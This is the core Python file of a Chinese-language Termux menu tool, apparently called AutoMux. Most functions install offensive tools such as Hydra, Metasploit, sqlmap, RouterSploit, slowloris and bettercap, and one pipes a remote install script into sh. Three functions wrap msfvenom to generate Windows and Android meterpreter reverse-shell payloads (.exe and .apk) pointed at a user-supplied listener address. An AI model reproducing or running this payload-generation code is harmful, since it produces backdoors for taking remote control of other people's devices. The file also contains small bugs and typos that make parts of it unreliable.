## MTcore.py 是Muxtools实现功能文件
# -*- coding: utf-8 -*-

import os, sys
from time import sleep as timeout
from termcolor import colored 

backmenu_banner = """
    [99] Bcak Menu
    [00] Exit
"""

def restart():
	python = sys.executable
	os.execl(python, python, * sys.argv)
	curdir = os.getcwd()

def backmenu():
    print(backmenu_banner)
    backtomenu = input(colored("AutoMux >>> ","yellow"))
    if backtomenu == "99" or backtomenu == "9":
        restart()
    elif backtomenu == "00" or backtomenu == "0":
        sys.exit()
    else:
        print(colored("\n输入错误，请重新输入！\n","red"))
        timeout(2)
        restart()  

def error():   
    print(colored("\n输入错误，请重新输入！\n","red"))
    timeout(2)
    restart() 

def okay():
    print(colored("\n安装成功！2秒后重启AutoMux\n","green"))
    timeout(2)
    restart()
    
def install_lazymux():
    print(colored("克隆Lazymux中，请稍后...","green"))
    os.system("git clone https://github.com/Gameye98/Lazymux.git $HOME/Lazymux")
    okay()

def install_Hydra():
    print(colored("安装Hydra中，请稍后...","green"))
    os.system("apt install hydra -y")
    print(colored("安装完成，输入'hydra'启动","green"))
    backmenu()

def qhd():
    print(colored("更换清华源中，请稍后...","green"))
    os.system("rm -rf $PREFIX/etc/apt/sources.list")
    os.system('echo "deb https://mirrors.tuna.tsinghua.edu.cn/termux stable main" >$PREFIX/etc/apt/sources.list')
    os.system("apt update")
    print(colored("更换成功！2秒后重启AutoMux","green"))
    timeout(2)
    restart()

def gfy():
    print(colored("更换官方源中，请稍后...","green"))
    os.system("rm -rf $PREFIX/etc/apt/sources.list")
    os.system('echo "deb https://termux.org/packages/ stable main" >$PREFIX/etc/apt/sources.list')
    os.system("apt  update")
    print(colored("更换成功！2秒后重启AutoMux","green"))
    timeout(2)
    restart()

def install_msf():
    print(colored("安装msf中，请稍候...","green"))
    os.system("apt install unstable-repo -y")
    os.system("apt install metasploit -y")
    print(colored("安装完成，输入'msfconsole'启动","green"))
    backmenu()

def install_nmap():
    print(colored("安装Nmap中，请稍候...","green"))
    os.system("apt install nmap -y")
    print(colored("安装完成，输入'nmap'启动","green"))
    backmenu()

def repair_msf():
    print(colored("修复msf数据库中，请稍候...","green"))
    os.system("pg_ctl -D $PREFIX/var/lib/postgresql -l logfile start")   
    print(colored("修复成功！2秒后重启AutoMux","green"))
    timeout(2)
    restart()

def install_zsh():
    print(colored("安装zsh中，请稍候...","green"))
    os.system('sh -c "$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh )"')
    okay()

def install_sqlmap():
    print(colored("安装sqlmap中，请稍候...","green"))
    os.system("apt install unstable-repo -y")
    os.system("apt install sqlmap -y")
    print(colored("安装完成，输入'sqlmap'启动","green"))
    backmenu()

def install_RouterSploit():
    print(colored("克隆RouterSploit中，请稍候...","green"))
    os.system("git clone https://www.github.com/threat9/routersploit $HOME/routersploit")
    okay()

def install_RED_HAWK():
    print(colored("克隆RED_HAWK中，请稍候...","green"))
    os.system("apt install php")
    os.system("git clone https://github.com/Tuhinshubhra/RED_HAWK.git $HOME/RED_HAWK")
    okay()

def install_slowloris():
    print(colored("克隆slowloris中，请稍候...","green"))
    os.system("git clone https://github.com/gkbrk/slowloris.git")
    okay()

def install_dnsmap():
    print(colored("克隆dnsmap中，请稍候...","green"))
    os.system("git clone https://github.com/makefu/dnsmap.git $HOME/dnsmap")
    okay() 

def install_sslscan():
    print(colored("安装sslscan中，请稍候...","green"))
    os.system("pkg install sslscan -y")
    print(colored("安装完成，输入'sslscan'启动","green"))
    backmenu() 

def install_SlowHTTPTest():
    print(colored("克隆SlowHTTPTest中，请稍候...","green"))
    os.system("git clone https://github.com/shekyan/slowhttptest.git $HOME/slowhttptest")
    okay() 

def install_bettercap():
    print(colored("安装Bettercap中，请稍候...","green"))
    os.system("apt install root-repo")
    os.system("apt install bettercap -y")
    print(colored("安装完成，输入'bettercap'启动","green"))
    backmenu()

def install_Cupp():
    print(colored("克隆Cupp中，请稍候...","green"))
    os.system("git clone https://github.com/Mebus/cupp.git $HOME/cupp")
    okay()    

def install_HashBuster():
    print(colored("克隆Hash-Buster中，请稍候...","green"))
    os.system("git clone https://github.com/UltimateHackers/Hash-Buster.git $HOME/Hash-Buster")
    okay()     

def WindouwsMM():
    LHOST = input(colored("请输入本机IP地址 >>> ","green"))
    LPORT = input(colored("请输入要监听的端口 >>> ","green"))
    exenmap = input(colored("请输入文件名字(.exe) >>> ","green"))
    bcml = input(colored("请输入保存地址 >>> ","green"))
    print(colored("正在为Windouws生成LHOST为: %s LPORT为: %s 的 %s文件...","yellow") %(LHOST,LPORT,exenmap))
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > %s/%s" % (LHOST,LPORT,bcml,exenmap))
    print(colored("生成完毕!2秒后重启程序","yellow"))
    timeout(2)
    restart()

def Windouws64MM():
    LHOST = input(colored("请输入本机IP地址 >>> ","green"))
    LPORT = input(colored("请输入要监听的端口 >>> ","green"))
    exenmap = input(colored("请输入文件名字(.exe) >>> ","green"))
    bcml = input(colored("请输入保存地址 >>> ","green"))
    print(colored("正在为Windouws X64生成LHOST为: %s LPORT为: %s 的 %s文件...","yellow") %(LHOST,LPORT,exenmap))
    os.system("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe > %s/%s" % (LHOST,LPORT,bcml,exenmap))
    print(colored("生成完毕!2秒后重启程序","yellow"))
    timeout(2)
    restart()

def msf_mm():
    print(colored("\n请选择运行系统:\n","blue"))
    print("    [01]  Windows")
    print("    [02]  Windows X64")
    print("    [03]  Android\n")
    print("    [00]  Bcak Menu\n")
    OS = input(colored("AutoMux >>> ","yellow"))
    if OS.strip() == "1" or OS.strip() == "01":WindouwsMM()
    elif OS.strip() == "2" or OS.strip() == "02":Windouws64MM()
    elif OS.strip() == "3" or OS.strip() == "03":AndroidMM()
    elif OS.strip() == "0" or OS.strip() == "00":restart()
    else:
        print(colored("\n输入错误，请重新输入！\n","red"))
        timeout(2)
        restart()

def AndroidMM():
    LHOST = input(colored("请输入本机IP地址 >>> ","green"))
    LPORT = input(colored("请输入要监听的端口 >>> ","green"))
    exenmap = input(colored("请输入文件名字(.apk) >>> ","green"))
    bcml = input(colored("请输入保存地址 >>> ","green"))
    print(colored("正在为Android生成LHOST为: %s LPORT为: %s 的 %s文件...","yellow") %(LHOST,LPORT,exenmap))
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s/%s" %(LHOST,LPORT,bcml,exenmap))
    print(colored("生成完毕!2秒后重启程序","yellow"))
    timeout(2)
    restart()

def install_hping3():
    print(colored("安装hping3中，请稍候...","green"))
    os.system("apt install root-repo")
    os.system("apt install hping3 -y")
    print(colored("安装完成，输入'hping3'启动","green"))
    backmenu()

def install_aircrack_ng():
    print(colored("安装Aircrack-ng中，请稍候...","green"))
    os.system("apt install root-repo")
    os.system("apt install aircrack-ng -y")
    print(colored("安装完成，输入'aircrack-ng'启动","green"))
    backmenu()

def install_WebCrack():
    print(colored("克隆WebCrack中，请稍候...","green"))
    os.system("git clone https://github.com/yzddmr6/WebCrack")
    os.system("pip install bs4 lxml requests")
    okay()

def install_webdirscan():
    print(colored("克隆webdirscan中，请稍候...","green"))
    os.system("git clone https://github.com/Strikersb/webdirscan.git")
    os.system("pip install requests")
    okay()

def install_Crunch():
    print(colored("安装Crunch中，请稍候...","green"))
    os.system("apt install unstble-repo -y")
    os.system("apt install crunch -y")
	#os.system("apt install crunch")
    print(colored("安装完成，输入'crunch'启动","green"))
    backmenu()